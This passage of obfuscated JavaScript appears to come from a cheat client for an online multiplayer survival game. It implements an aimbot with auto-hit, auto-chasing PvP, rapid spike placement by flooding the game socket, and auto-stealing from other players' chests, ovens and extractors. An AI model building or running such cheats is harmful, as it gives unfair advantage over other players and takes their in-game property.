            a0DEFErport(a0OVERrideclick.REIDITE_SPIKE);
            a0DEFErport(a0OVERrideclick.REIDITE_WALL);
            a0DEFErport(a0OVERrideclick.AMETHYST_WALL);
            a0DEFErport(a0OVERrideclick.DIAMOND_WALL);
            a0DEFErport(a0OVERrideclick.GOLD_WALL);
            a0DEFErport(a0OVERrideclick.STONE_WALL);
            a0DEFErport(a0OVERrideclick.WOOD_WALL);
          }
        } else if (a0JUMPfile.AutoCraftSpikes.p === "Amethyst Spike") {
          if (a0HANDlefunction(a0OVERrideclick.AMETHYST_SPIKE, USERTOFIX.inv.n)) {
            a0DEFErport(a0OVERrideclick.AMETHYST_SPIKE);
            a0DEFErport(a0OVERrideclick.AMETHYST_WALL);
            a0DEFErport(a0OVERrideclick.DIAMOND_WALL);
            a0DEFErport(a0OVERrideclick.GOLD_WALL);
            a0DEFErport(a0OVERrideclick.STONE_WALL);
            a0DEFErport(a0OVERrideclick.WOOD_WALL);
          }
        } else if (a0JUMPfile.AutoCraftSpikes.p === "Diamond Spike") {
          if (a0HANDlefunction(a0OVERrideclick.DIAMOND_SPIKE, USERTOFIX.inv.n)) {
            a0DEFErport(a0OVERrideclick.DIAMOND_SPIKE);
            a0DEFErport(a0OVERrideclick.DIAMOND_WALL);
            a0DEFErport(a0OVERrideclick.GOLD_WALL);
            a0DEFErport(a0OVERrideclick.STONE_WALL);
            a0DEFErport(a0OVERrideclick.WOOD_WALL);
          }
        } else if (a0JUMPfile.AutoCraftSpikes.p === "Gold Spike") {
          if (a0HANDlefunction(a0OVERrideclick.GOLD_SPIKE, USERTOFIX.inv.n)) {
            a0DEFErport(a0OVERrideclick.GOLD_SPIKE);
            a0DEFErport(a0OVERrideclick.GOLD_WALL);
            a0DEFErport(a0OVERrideclick.STONE_WALL);
            a0DEFErport(a0OVERrideclick.WOOD_WALL);
          }
        } else if (a0JUMPfile.AutoCraftSpikes.p === "Stone Spike") {
          if (a0HANDlefunction(a0OVERrideclick.STONE_SPIKE, USERTOFIX.inv.n)) {
            a0DEFErport(a0OVERrideclick.STONE_SPIKE);
            a0DEFErport(a0OVERrideclick.STONE_WALL);
            a0DEFErport(a0OVERrideclick.WOOD_WALL);
          }
        } else if (a0JUMPfile.AutoCraftSpikes.p === "Wood Spike" && a0HANDlefunction(a0OVERrideclick.WOOD_SPIKE, USERTOFIX.inv.n)) {
          a0DEFErport(a0OVERrideclick.WOOD_SPIKE);
          a0DEFErport(a0OVERrideclick.WOOD_WALL);
        }
      }
      if (a0JUMPfile.SpikeCrafter.e) {
        if (!USERTOFIX.inv.n[a0CONNectloop.BERRY] && e && performance.now() - a0INSTallkey > a0BUILdresult + 200) {
          for (let X of a0CLONelog.units[a0HOOKjob.CHEST]) {
            if ((!X.lock || X.ally) && X.action / 2 - 1 === a0CONNectloop.BERRY && a0CLONescript.dist(e, X) <= 150) {
              a0JUMPstats(X.pid, X.id);
              a0INSTallkey = performance.now();
            }
          }
        }
        let q;
        switch (a0JUMPfile.SpikeCrafter.target) {
          case "Reidite Spike":
            q = a0CONNectloop.REIDITE_SPIKE;
            break;
          case "Amethyst Spike":
            q = a0CONNectloop.AMETHYST_SPIKE;
            break;
          case "Diamond Spike":
            q = a0CONNectloop.DIAMOND_SPIKE;
            break;
          case "Gold Spike":
            q = a0CONNectloop.GOLD_SPIKE;
            break;
          case "Stone Spike":
            q = a0CONNectloop.STONE_SPIKE;
            break;
          case "Wood Spike":
            q = a0CONNectloop.WOOD_SPIKE;
            break;
          case "Wood Wall":
            q = a0CONNectloop.WOOD_WALL;
        }
        if (e && USERTOFIX.inv.n[q]) {
          if (!a0ENDZip[q] || a0ENDZip[q].action / 2 - 1 !== q || a0ENDZip[q].info >= 8000 || a0CLONescript.dist(a0ENDZip[q], e) > 150) {
            a0ENDZip[q] = null;
            let Q = false;
            for (let Z of a0CLONelog.units[a0HOOKjob.CHEST]) {
              if ((!Z.lock || Z.ally) && Z.action / 2 - 1 === q && Z.info < 8000 && a0CLONescript.dist(e, Z) <= 150) {
                a0ENDZip[q] = Z;
                Q = true;
              }
            }
            if (!Q) {
              for (let ee of a0CLONelog.units[a0HOOKjob.CHEST]) {
                if ((!ee.lock || ee.ally) && ee.action / 2 - 1 == -1 && a0CLONescript.dist(e, ee) <= 150) {
                  a0ENDZip[q] = ee;
                  break;
                }
              }
            }
          }
          if (a0ENDZip[q]) {
            let ea = USERTOFIX.inv.n[q];
            let et = a0ENDZip[q];
            let ei = 8000 - et.info;
            a0EXPAndstats(q, Math.min(255, ea > ei ? ei : ea), et.pid, et.id);
          }
        }
        let e$ = a0DECOdenode(q, USERTOFIX.inv.n);
        if (e$ && Object.keys(e$).length > 0) {
          if (e && performance.now() - a0FETChfile > a0BUILdresult + 200) {
            for (let eo in e$) {
              if (!a0ENDZip[eo] || a0ENDZip[eo].action / 2 - 1 !== eo || a0CLONescript.dist(e, a0ENDZip[eo]) > 150 || a0ENDZip[eo].lock && !a0ENDZip[eo].ally) {
                a0ENDZip[eo] = null;
                for (let el of a0CLONelog.units[a0HOOKjob.CHEST]) {
                  if ((!el.lock || el.ally) && el.action / 2 - 1 === Number(eo) && a0CLONescript.dist(e, el) <= 150) {
                    a0ENDZip[eo] = el;
                    break;
                  }
                }
              }
              if (a0ENDZip[eo]) {
                a0JUMPstats(a0ENDZip[eo].pid, a0ENDZip[eo].id);
              }
            }
            a0FETChfile = performance.now();
          }
        } else {
          a0CLOSeinput(q);
        }
      }
    }
    if (e) {
      if (a0DRAWparser) {
        a0MINIfyresult.update_connection();
        a0MINIfyresult.update_scene();
      }
      if (a0JUMPfile.Aimbot.e && !a0JUMPfile.AutoPvP.e) {
        switch (a0MINIfytoken(e.right, true)) {
          case 1:
            var en = e.fly ? 196.8 : 157.6;
            break;
          case 2:
            var en = e.fly ? 291.8 : 227.6;
            break;
          case 3:
            var en = 620;
            break;
          case 4:
            var en = e.fly ? 142 : 131;
          case 6:
            if (e.clothe == a0CONNectloop.WINTER_HOOD || e.clothe == a0CONNectloop.HOOD) {
              var en = 97.6;
            } else {
              a0JUMPfile.Aimbot.angle = null;
            }
            break;
          default:
            a0JUMPfile.Aimbot.angle = null;
        }
        if (en) {
          let es = false;
          let er = a0NAVIgatestring(e, a0CLONelog.units[a0HOOKjob.PLAYERS]);
          if (er) {
            let ec = a0CLONescript.dist(e, er);
            if (ec <= en) {
              es = true;
              let eO = a0KICKport(e, er, true);
              a0JUMPfile.Aimbot.angle = eO;
              a0BUILdstats(eO);
              if (a0JUMPfile.Aimbot.autoHit && ec <= en - 22) {
                a0REMOveevent(eO);
                a0CLONejson();
              }
            } else {
              a0JUMPfile.Aimbot.angle = null;
            }
          } else {
            a0JUMPfile.Aimbot.angle = null;
          }
          if (!es) {
            let ep = a0CLOSeattempt(e, [...(a0JUMPfile.Aimbot.isAimbotGoldenChicken ? a0CLONelog.units[a0HOOKjob.GOLDEN_CHICKEN] : []), ...(a0JUMPfile.Aimbot.isAimbotRabbit ? a0CLONelog.units[a0HOOKjob.RABBIT] : [])]);
            if (ep) {
              let eu = a0CLONescript.dist(e, ep);
              if (eu <= en) {
                es = true;
                let eN = a0KICKport(e, ep, true);
                a0JUMPfile.Aimbot.angle = eN;
                a0BUILdstats(eN);
                if (a0JUMPfile.Aimbot.autoHit && eu <= en - 22) {
                  a0REMOveevent(eN);
                  a0CLONejson();
                }
              } else {
                a0JUMPfile.Aimbot.angle = null;
              }
            } else {
              a0JUMPfile.Aimbot.angle = null;
            }
          }
        }
      }
      if (a0JUMPfile.AutoPvP.e) {
        let eE = null;
        let ed = a0MAPRoute(e, a0CLONelog.units[a0HOOKjob.PLAYERS], a0JUMPfile.AutoPvP.distanceToChase);
        if (ed.length > 0) {
          if (a0DRAWbuffer.autopvpLockId) {
            eE = ed.find(e => e.pid === a0DRAWbuffer.autopvpLockId);
          }
          eE ||= a0EXTRactfolder(e, ed);
        }
        if (eE) {
          let ef;
          ef = a0CLONescript.dist(e, eE);
          if (a0JUMPfile.AutoPvP.isPullWeapon && !e.weapon && ef <= a0JUMPfile.AutoPvP.rangePullWeapon) {
            let eg = USERTOFIX.inv.can_select;
            for (let eA = 0, eh = eg.length; eA < eh; eA++) {
              let eR = eg[eA].id;
              if (a0INSErtform[eR]) {
                a0GETList.select_inv(eR);
                a0EXITdrive = true;
                workerTimers.setTimeout(() => {
                  a0EXITdrive = false;
                }, a0BUILdresult + 50);
                break;
              }
            }
          }
          if (ef <= a0JUMPfile.AutoPvP.rangePullHelmet && a0JUMPfile.AutoPvP.isPullHelmet && performance.now() - a0OVERridezip >= a0BUILdresult + 100 && !a0DISPatchcommit[e.clothe]) {
            for (let eC = 0; eC < a0EXPAndpath.length; eC++) {
              if (USERTOFIX.inv.n[a0EXPAndpath[eC]]) {
                a0GETList.select_inv(a0EXPAndpath[eC]);
                a0OVERridezip = performance.now();
                break;
              }
            }
          }
          let ey = {
            x: e.r.x,
            y: e.r.y,
            speed: e.speed
          };
          let em = a0BALAnceinput(ey, eE.r);
          if (em === 0) {
            em = a0BALAnceinput(ey, a0CLONequeue(eE));
          }
          if (a0PARSealive === 0) {
            a0OPENdata(em);
          }
          switch (a0MINIfytoken(e.right, false)) {
            case 1:
              var en = e.fly ? 196.8 : 157.6;
              break;
            case 2:
              var en = e.fly ? 291.8 : 227.6;
              break;
            case 3:
              var en = 620;
              break;
            case 4:
              var en = e.fly ? 142 : 131;
            case 5:
              var en = 125;
              break;
            case 6:
              if (e.clothe == a0CONNectloop.WINTER_HOOD || e.clothe == a0CONNectloop.HOOD) {
                var en = 97.6;
              } else {
                a0JUMPfile.Aimbot.angle = null;
              }
              break;
            default:
              a0JUMPfile.Aimbot.angle = null;
          }
          if (en) {
            if (ef <= en) {
              let eM;
              eM = a0JUMPfile.AutoPvP.aimbotMode === a0JUMPfile.AutoPvP.aimbotModeList[0] ? a0KICKport(a0CLONequeue(e), a0CLONequeue(eE), false) : a0KICKport(e, eE, true);
              a0JUMPfile.Aimbot.angle = eM;
              a0BUILdstats(eM);
              if (a0JUMPfile.Aimbot.angle && ef <= en - 22) {
                a0REMOveevent(eM);
                a0CLONejson();
              }
            } else {
              a0JUMPfile.Aimbot.angle = null;
            }
          }
          if (!a0JUMPfile.AutoSpike.e && !a0JUMPfile.AutoWall.e && !a0JUMPfile.AimbotSpike.e && a0JUMPfile.AutoPvP.isAutoSpike) {
            let eL = false;
            let eP = a0CLONescript.dist(e.r, eE.r);
            let eD = a0CLONescript.dist(a0CLONequeue(e), a0CLONequeue(eE));
            if (eP <= a0JUMPfile.AutoPvP.maxAutoSpikeDistance && eP >= a0JUMPfile.AutoPvP.minAutoSpikeDistance || eD <= a0JUMPfile.AutoPvP.maxAutoSpikeDistance && eD >= a0JUMPfile.AutoPvP.minAutoSpikeDistance) {
              if (a0JUMPfile.AutoPvP.autoSpikeWhen === "PulledGear") {
                if (a0EXITdrive || e.weapon) {
                  eL = true;
                }
              } else if (a0JUMPfile.AutoPvP.autoSpikeWhen === "InRange") {
                eL = true;
              }
            }
            if (eL) {
              for (let eT = 0, e_ = a0JUMPfile.AutoSpike.p; eT < e_.length; eT++) {
                var eI = e_[eT];
                switch (eI) {
                  case "Reidite Spike":
                    eI = a0CONNectloop.REIDITE_SPIKE;
                    break;
                  case "Amethyst Spike":
                    eI = a0CONNectloop.AMETHYST_SPIKE;
                    break;
                  case "Diamond Spike":
                    eI = a0CONNectloop.DIAMOND_SPIKE;
                    break;
                  case "Gold Spike":
                    eI = a0CONNectloop.GOLD_SPIKE;
                    break;
                  case "Stone Spike":
                    eI = a0CONNectloop.STONE_SPIKE;
                    break;
                  case "Wood Spike":
                    eI = a0CONNectloop.WOOD_SPIKE;
                    break;
                  case "Wood Wall":
                    eI = a0CONNectloop.WOOD_WALL;
                    break;
                  case "Nothing":
                    eI = -1;
                }
                if (eI !== -1 && USERTOFIX.inv.n[eI]) {
                  var e8 = eI;
                  break;
                }
              }
              if (e8) {
                let eS;
                eS = a0JUMPfile.AutoPvP.autospikeMode === a0JUMPfile.AutoPvP.autospikeModeList[0] ? a0KICKport(a0CLONequeue(e), a0CLONequeue(eE), false) : a0KICKport(e, eE, true);
                let ek = Math.PI * 2;
                let eb = Math.floor((eS + ek) % ek * 255 / ek);
                a0GETList.socket.send(JSON.stringify([a0POSTfile.build, e8, eb, 0]));
                if (a0JUMPfile.AutoPvP.is360) {
                  for (let ev = 8; ev < 127; ev += 8) {
                    a0GETList.socket.send(JSON.stringify([a0POSTfile.build, e8, (ev + eb) % 255, 0]));
                    a0GETList.socket.send(JSON.stringify([a0POSTfile.build, e8, (eb - ev + 255) % 255, 0]));
                  }
                } else {
                  for (let e0 = 2; e0 < 31; e0 += 2) {
                    a0GETList.socket.send(JSON.stringify([a0POSTfile.build, e8, (e0 + eb) % 255, 0]));
                    a0GETList.socket.send(JSON.stringify([a0POSTfile.build, e8, (eb - e0 + 255) % 255, 0]));
                  }
                }
              }
            }
          }
        } else {
          a0JUMPfile.AutoPvP.angle = null;
        }
      }
      if (a0JUMPfile.AutoSpike.e) {
        let eH;
        for (let eU = 0, e3 = a0JUMPfile.AutoSpike.p; eU < e3.length; eU++) {
          switch (e3[eU]) {
            case "Reidite Spike":
              eH = a0CONNectloop.REIDITE_SPIKE;
              break;
            case "Amethyst Spike":
              eH = a0CONNectloop.AMETHYST_SPIKE;
              break;
            case "Diamond Spike":
              eH = a0CONNectloop.DIAMOND_SPIKE;
              break;
            case "Gold Spike":
              eH = a0CONNectloop.GOLD_SPIKE;
              break;
            case "Stone Spike":
              eH = a0CONNectloop.STONE_SPIKE;
              break;
            case "Wood Spike":
              eH = a0CONNectloop.WOOD_SPIKE;
              break;
            case "Wood Wall":
              eH = a0CONNectloop.WOOD_WALL;
              break;
            case "Nothing":
              eH = -1;
          }
          if (eH !== 1 && USERTOFIX.inv.n[eH]) {
            break;
          }
        }
        if (eH) {
          let eB;
          if (a0JUMPfile.AutoSpike.IsFollowMouse) {
            let ej;
            ej = e ? {
              x: USERTOFIX.cam.x + e.x,
              y: USERTOFIX.cam.y + e.y
            } : a0LOADsocket;
            eB = a0KICKport(a0DECOdestatus.pos, ej, false) + Math.PI;
          } else {
            eB = e.nangle;
          }
          let ex = Math.PI * 2;
          let e1 = Math.floor((eB + ex) % ex * 255 / ex);
          a0GETList.socket.send(JSON.stringify([a0POSTfile.build, eH, e1, 0]));
          if (a0JUMPfile.AutoSpike.isSpikeInWater && USERTOFIX.team.length > 0 && !a0GUARdfolder) {
            let eK = {
              r: {
                x: e.x + a0NOTIfyload(eB) * 120,
                y: e.y + a0GETPlugin(eB) * 120
              }
            };
            a0CLONelog.dist_from_biomes(eK);
            let ew = Object.values(eK)[8];
            if (ew === 1) {
              a0OPTImizekey(eK.r.x, eK.r.y);
              a0GUARdfolder = true;
              workerTimers.setTimeout(() => {
                a0GUARdfolder = false;
              }, 2000);
            }
          }
          if (a0JUMPfile.AutoSpike.AngleSpread) {
            let eJ;
            if (a0JUMPfile.AutoSpike.angleSpreadMode === "Low") {
              eJ = 1;
            } else if (a0JUMPfile.AutoSpike.angleSpreadMode === "Medium") {
              eJ = 2;
            } else if (a0JUMPfile.AutoSpike.angleSpreadMode === "High") {
              eJ = 3;
            } else if (a0JUMPfile.AutoSpike.angleSpreadMode === "360") {
              eJ = 8;
            }
            for (let ez = 1; ez < 16; ez++) {
              let eF = ez * eJ;
              a0GETList.socket.send(JSON.stringify([a0POSTfile.build, eH, e1 + eF, 0]));
              a0GETList.socket.send(JSON.stringify([a0POSTfile.build, eH, e1 - eF, 0]));
            }
          }
        }
      } else if (a0JUMPfile.AutoWall.e) {
        let eW;
        if (USERTOFIX.inv.n[a0CONNectloop.WOOD_WALL]) {
          eW = a0CONNectloop.WOOD_WALL;
        }
        if (eW) {
          let e4;
          if (a0JUMPfile.AutoWall.IsFollowMouse) {
            let e2;
            e2 = e ? {
              x: USERTOFIX.cam.x + e.x,
              y: USERTOFIX.cam.y + e.y
            } : a0LOADsocket;
            e4 = a0KICKport(a0DECOdestatus.pos, e2, false) + Math.PI;
          } else {
            e4 = e.nangle;
          }
          let e6 = Math.PI * 2;
          let eG = Math.floor((e4 + e6) % e6 * 255 / e6);
          a0GETList.socket.send(JSON.stringify([a0POSTfile.build, eW, eG, 0]));
          if (a0JUMPfile.AutoWall.AngleSpread) {
            for (let e7 = 2; e7 < 31; e7 += 2) {
              a0GETList.socket.send(JSON.stringify([a0POSTfile.build, eW, eG + e7, 0]));
              a0GETList.socket.send(JSON.stringify([a0POSTfile.build, eW, eG - e7, 0]));
            }
          }
        }
      } else if (a0JUMPfile.AimbotSpike.e) {
        let e5 = a0EXTRactfolder(e, a0CLONelog.units[a0HOOKjob.PLAYERS]);
        if (e5 && a0CLONescript.dist(e, e5) <= a0JUMPfile.AimbotSpike.distance) {
          let eV;
          for (let eY = 0, eX = a0JUMPfile.AutoSpike.p; eY < eX.length; eY++) {
            switch (eX[eY]) {
              case "Reidite Spike":
                eV = a0CONNectloop.REIDITE_SPIKE;
                break;
              case "Amethyst Spike":
                eV = a0CONNectloop.AMETHYST_SPIKE;
                break;
              case "Diamond Spike":
                eV = a0CONNectloop.DIAMOND_SPIKE;
                break;
              case "Gold Spike":
              case "Stone Spike":
                eV = a0CONNectloop.GOLD_SPIKE;
                break;
              case "Wood Spike":
                eV = a0CONNectloop.SPIKE;
                break;
              case "Wood Wall":
                eV = a0CONNectloop.WALL;
                break;
              case "Nothing":
                eV = -1;
            }
            if (eV !== 1 && USERTOFIX.inv.n[eV]) {
              break;
            }
          }
          if (eV) {
            let eq = Math.PI * 2;
            let eQ = a0KICKport(e, e5, false);
            let eZ = a0KICKport(e, a0CLONequeue(e5), false);
            let e9 = Math.floor((eQ + eq) % eq * 255 / eq);
            a0GETList.socket.send(JSON.stringify([a0POSTfile.build, eV, e9, 0]));
            if (eZ > eQ) {
              for (let ae = 1; ae < 31; ae++) {
                a0GETList.socket.send(JSON.stringify([a0POSTfile.build, eV, e9 + ae, 0]));
              }
            } else {
              for (let aa = 1; aa < 31; aa++) {
                a0GETList.socket.send(JSON.stringify([a0POSTfile.build, eV, e9 - aa, 0]));
              }
            }
          }
        }
      } else if (a0JUMPfile.AutoBuild.e && USERTOFIX.inv.n[a0JOINfile]) {
        let at = Math.PI * 2;
        a0BLOCkmodule(a0JOINfile, Math.floor((e.angle + at) % at * 255 / at));
      } else if (a0JUMPfile.AutoSeed.e && USERTOFIX.inv.n[a0POSTqueue] && performance.now() - a0PROCessfile > 300) {
        a0PROCessfile = performance.now();
        for (let ai = 0; ai < 256; ai += 2) {
          a0BLOCkmodule(a0POSTqueue, ai);
        }
        a0BLOCkmodule(a0POSTqueue, 0, 1);
        a0BLOCkmodule(a0POSTqueue, 32, 1);
        a0BLOCkmodule(a0POSTqueue, 64, 1);
        a0BLOCkmodule(a0POSTqueue, 96, 1);
        a0BLOCkmodule(a0POSTqueue, 128, 1);
        a0BLOCkmodule(a0POSTqueue, 160, 1);
        a0BLOCkmodule(a0POSTqueue, 192, 1);
        a0BLOCkmodule(a0POSTqueue, 224, 1);
      }
      if (a0JUMPfile.AutoFarm.e) {
        let a$ = a0CLONelog.fast_units[a0JUMPfile.AutoFarm.chestToPutBerry.pid * a0CLONelog.max_units + a0JUMPfile.AutoFarm.chestToPutBerry.id];
        if (a0JUMPfile.AutoFarm.isPutBerryToChest && a0JUMPfile.AutoFarm.chestToPutBerry.pid && a0JUMPfile.AutoFarm.chestToPutBerry.id && USERTOFIX.inv.n[a0CONNectloop.BERRY] >= a0JUMPfile.AutoFarm.berryPutThreshold && USERTOFIX.gauges.l * 200 > 120 && a$ && (a$.ally || !a$.lock) && a$.info < 8000) {
          if (a0PARSealive === 0) {
            a0OPENdata(a0BALAnceinput(e, a$));
          }
          if (a0CLONescript.dist(e, a$) < 300) {
            let ao = USERTOFIX.inv.n[a0CONNectloop.BERRY];
            while (ao > 0) {
              let al = Math.min(ao, 255);
              ao -= al;
              a0EXPAndstats(a0CONNectloop.BERRY, al, a$.pid, a$.id);
            }
          }
        } else {
          let an = {
            obj: null,
            dist: -1,
            type: 0
          };
          let as = {
            x: a0JUMPfile.AutoFarm.x,
            y: a0JUMPfile.AutoFarm.y,
            width: a0JUMPfile.AutoFarm.xx - a0JUMPfile.AutoFarm.x,
            height: a0JUMPfile.AutoFarm.yy - a0JUMPfile.AutoFarm.y
          };
          let ar = [...a0CLONelog.units[a0HOOKjob.PUMPKIN_SEED], ...a0CLONelog.units[a0HOOKjob.SEED], ...a0CLONelog.units[a0HOOKjob.WHEAT_SEED], ...a0CLONelog.units[a0HOOKjob.THORNBUSH_SEED], ...a0CLONelog.units[a0HOOKjob.GARLIC_SEED], ...a0CLONelog.units[a0HOOKjob.CARROT_SEED], ...a0CLONelog.units[a0HOOKjob.ALOE_VERA_SEED], ...a0CLONelog.units[a0HOOKjob.WATERMELON_SEED], ...a0CLONelog.units[a0HOOKjob.TOMATO_SEED]];
          for (let ac = 0, aO = ar.length, ap = null, au = null; ac < aO; ac++) {
            if ((ap = ar[ac]).info && ap.info !== 10 && (a0JUMPfile.AutoFarm.water || ap.info !== 16) && as.x < ap.x - 50 + 100 && as.x + as.width > ap.x - 50 && as.y < ap.y - 50 + 100 && as.y + as.height > ap.y - 50) {
              au = (e.x - ap.x) ** 2 + (e.y - ap.y) ** 2;
              if (an.dist === -1 || au < an.dist) {
                an.dist = au;
                an.obj = ap;
              }
            }
          }
          if (an.obj && USERTOFIX.gauges.l * 200 > 120) {
            an.dist = a0CLONescript.dist(e, an.obj);
            switch (an.obj.info) {
              case 1:
              case 2:
              case 3:
                if (USERTOFIX.inv.n[a0CONNectloop.PITCHFORK_2] && e.right !== a0CONNectloop.PITCHFORK_2) {
                  a0HYDRatequeue(a0CONNectloop.PITCHFORK_2);
                } else if (USERTOFIX.inv.n[a0CONNectloop.PITCHFORK] && e.right !== a0CONNectloop.PITCHFORK) {
                  a0HYDRatequeue(a0CONNectloop.PITCHFORK);
                }
                an.type = 2;
                break;
              case 16:
              case 17:
              case 18:
              case 19:
                if (a0JUMPfile.AutoFarm.water) {
                  if (USERTOFIX.inv.n[a0CONNectloop.WATERING_CAN_FULL]) {
                    if (e.right !== a0CONNectloop.WATERING_CAN_FULL) {
                      a0HYDRatequeue(a0CONNectloop.WATERING_CAN_FULL);
                    }
                    an.type = 1;
                  }
                } else {
                  if (USERTOFIX.inv.n[a0CONNectloop.PITCHFORK_2]) {
                    if (a0CONNectloop.PITCHFORK_2 !== e.right) {
                      a0HYDRatequeue(INV_PITCHFORK_2);
                    }
                  } else if (USERTOFIX.inv.n[a0CONNectloop.PITCHFORK] && a0CONNectloop.PITCHFORK !== e.right) {
                    a0HYDRatequeue(a0CONNectloop.PITCHFORK);
                  }
                  an.type = 2;
                }
            }
            let aN = {
              x: e.x - an.obj.x,
              y: e.y - an.obj.y
            };
            let aE = {
              x: Math.abs(e.x - an.obj.x),
              y: Math.abs(e.y - an.obj.y)
            };
            let ad = 0;
            if (aE.x > 30) {
              if (aN.x > 0) {
                ad += 1;
              }
              if (aN.x < 0) {
                ad += 2;
              }
            }
            if (aE.y > 30) {
              if (aN.y > 0) {
                ad += 8;
              }
              if (aN.y < 0) {
                ad += 4;
              }
            }
            if (a0PARSealive === 0) {
              a0OPENdata(ad);
            }
            if (aE.x < (an.type === 1 ? 120 : 300) && aE.y < (an.type === 1 ? 120 : 300)) {
              let af = a0KICKport(e, an.obj, false);
              a0JUMPfile.AutoFarm.angle = af;
              if (a0JUMPfile.AutoFarm.angle) {
                a0REMOveevent(af);
                visualAngle = af;
                a0CLONejson();
              }
            }
          } else {
            let ag = {
              x: e.x - a0JUMPfile.AutoFarm.sx,
              y: e.y - a0JUMPfile.AutoFarm.sy
            };
            let aA = {
              x: Math.abs(e.x - a0JUMPfile.AutoFarm.sx),
              y: Math.abs(e.y - a0JUMPfile.AutoFarm.sy)
            };
            let ah = 0;
            if (aA.x > 50) {
              if (ag.x > 0) {
                ah += 1;
              }
              if (ag.x < 0) {
                ah += 2;
              }
            }
            if (aA.y > 50) {
              if (ag.y > 0) {
                ah += 8;
              }
              if (ag.y < 0) {
                ah += 4;
              }
            }
            if (a0PARSealive === 0) {
              a0OPENdata(ah);
            }
          }
        }
      }
      if (a0JUMPfile.AutoCrown.e && USERTOFIX.inv.n[a0CONNectloop.CROWN_OF_THE_ANGEL] && e.ghost) {
        for (let aR of a0CLONelog.units[a0HOOKjob.RESURRECTION]) {
          if (a0CLONescript.dist(e, aR) < 300) {
            a0HIGHlightlogs(aR.pid, aR.id);
            break;
          }
        }
      }
      if (a0JUMPfile.ExitVehicle.e) {
        if (e.vehicle !== 0) {
          if (e.speed < 100 && performance.now() - a0OVERrideparser > a0BUILdresult + 125) {
            a0OVERrideparser = performance.now();
            a0HYDRatequeue(e.vehicle);
          }
        } else {
          a0JUMPfile.ExitVehicle.e = false;
        }
      }
      if (a0JUMPfile.AutoTame.e && !a0NOOPuser && e.right === a0CONNectloop.SADDLE) {
        let aC = [...a0CLONelog.units[a0HOOKjob.BABY_DRAGON], ...a0CLONelog.units[a0HOOKjob.BABY_LAVA], ...a0CLONelog.units[a0HOOKjob.GOLDEN_HEN], ...a0CLONelog.units[a0HOOKjob.BABY_MAMMOTH], ...a0CLONelog.units[a0HOOKjob.HAWK], ...a0CLONelog.units[a0HOOKjob.CRAB_BOSS], ...a0CLONelog.units[a0HOOKjob.BOAR]].filter(t => a0CLONescript.dist(e, t) <= 200);
        if (aC.length > 0) {
          let ay = aC.every(e => e.info === 0);
          if (ay) {
            let am = a0KICKport(e, aC[0], true);
            a0JUMPfile.AutoTame.angle = am;
            a0BUILdstats(am);
            a0REMOveevent(am);
            a0CLONejson();
            a0NOOPuser = true;
            workerTimers.setTimeout(() => {
              a0NOOPuser = false;
            }, 580 + a0BUILdresult);
          } else {
            a0JUMPfile.AutoTame.angle = null;
          }
        } else {
          a0JUMPfile.AutoTame.angle = null;
        }
      } else {
        a0JUMPfile.AutoTame.angle = null;
      }
      if (a0JUMPfile.ExtractorTake.e || a0JUMPfile.AutoSteal.e) {
        let aM = [a0HOOKjob.EXTRACTOR_MACHINE_STONE, a0HOOKjob.EXTRACTOR_MACHINE_GOLD, a0HOOKjob.EXTRACTOR_MACHINE_DIAMOND, a0HOOKjob.EXTRACTOR_MACHINE_AMETHYST, a0HOOKjob.EXTRACTOR_MACHINE_REIDITE];
        aM.forEach(t => {
          let i = a0CLONelog.units[t];
          if (Array.isArray(i)) {
            for (let $ of i) {
              if (e && $ && a0CLONescript.dist(e, $) <= 330) {
                a0BLOCkinput($.pid, $.id, t);
              }
            }
          }
        });
      }
      if (a0JUMPfile.ExtractorPut.e) {
        let aL = [a0HOOKjob.EXTRACTOR_MACHINE_STONE, a0HOOKjob.EXTRACTOR_MACHINE_GOLD, a0HOOKjob.EXTRACTOR_MACHINE_DIAMOND, a0HOOKjob.EXTRACTOR_MACHINE_AMETHYST, a0HOOKjob.EXTRACTOR_MACHINE_REIDITE];
        aL.forEach(t => {
          let i = a0CLONelog.units[t];
          if (Array.isArray(i)) {
            for (let $ of i) {
              if (e && $ && a0CLONescript.dist(e, $) <= 330) {
                a0DRAWform($.pid, $.id, t);
              }
            }
          }
        });
      }
      if (a0JUMPfile.AutoSteal.e) {
        let aP = a0CLONelog.units[a0HOOKjob.CHEST].filter(t => (t.ally || !t.lock) && a0CLONescript.dist(e, t) <= 300);
        for (let aD = 0, aT = aP.length; aD < aT; aD++) {
          let a_ = aP[aD];
          a0JUMPstats(a_.pid, a_.id);
          if (a_.info) {
            a0JUMPstats(a_.pid, a_.id);
            a0JUMPstats(a_.pid, a_.id);
            a0JUMPstats(a_.pid, a_.id);
          }
        }
      }
      if (a0JUMPfile.AutoBreadPut.e) {
        var aI = a0CLONelog.units[a0HOOKjob.BREAD_OVEN];
        for (let a8 = 0; a8 < aI.length; a8++) {
          if (e && aI[a8] && a0CLONescript.dist(e, aI[a8]) <= 330) {
            a0LOCKclick(aI[a8].pid, aI[a8].id);
            a0GENErateuser(aI[a8].pid, aI[a8].id);
          }
        }
      }
      if (a0JUMPfile.AutoBreadTake.e || a0JUMPfile.AutoSteal.e) {
        var aI = a0CLONelog.units[a0HOOKjob.BREAD_OVEN];
        for (let aS = 0; aS < aI.length; aS++) {
          if (e && aI[aS] && a0CLONescript.dist(e, aI[aS]) <= 330) {
            a0PULLclock(aI[aS].pid, aI[aS].id);
          }
        }
      }
      if (a0JUMPfile.AutoBreadPut.e) {
        var aI = a0CLONelog.units[a0HOOKjob.WINDMILL];
        for (let ak = 0; ak < aI.length; ak++) {
          if (e && aI[ak] && a0CLONescript.dist(e, aI[ak]) <= 330) {
            a0ACCEptbuffer(aI[ak].pid, aI[ak].id);
          }
        }
      }
      if (a0JUMPfile.AutoBreadTake.e || a0JUMPfile.AutoSteal.e) {
        var aI = a0CLONelog.units[a0HOOKjob.WINDMILL];
        for (let ab = 0; ab < aI.length; ab++) {
          if (e && aI[ab] && a0CLONescript.dist(e, aI[ab]) <= 330) {
            a0GUARditem(aI[ab].pid, aI[ab].id);
          }
        }
      }
      if (a0JUMPfile.AutoFire.e && !USERTOFIX.craft.crafting) {
        if (USERTOFIX.inv.n[a0CONNectloop.CAMPFIRE]) {
          a0LOADapp = performance.now();
          let av = Math.PI * 2;
          let a0 = Math.floor((e.angle + av) % av * 255 / av);
          a0BLOCkmodule(a0CONNectloop.CAMPFIRE, a0);
          for (let aH = 1; aH < 31; aH += 2) {
            a0BLOCkmodule(a0CONNectloop.CAMPFIRE, a0 + aH);
            a0BLOCkmodule(a0CONNectloop.CAMPFIRE, a0 - aH);
          }
        } else if (performance.now() - a0LOADapp > 1000) {
